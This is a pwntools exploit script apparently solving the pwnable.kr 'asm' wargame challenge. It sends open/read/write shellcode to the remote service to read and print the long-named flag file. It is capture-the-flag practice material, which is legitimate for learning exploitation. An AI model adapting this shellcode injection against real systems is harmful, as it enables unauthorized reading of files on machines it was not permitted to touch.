#!/usr/bin/env python3

from pwn import *

exe = ELF("asm")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:

        r = remote('pwnable.kr', 9026)

    return r


def main():
    r = conn()

    sh  = shellcraft.open('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
    sh += shellcraft.read(3, 'rsp', 0x100)
    sh += shellcraft.write(1, 'rsp', 0x100)
    print(sh)
    r.sendline(asm(sh))

    r.interactive()


if __name__ == "__main__":
    main()
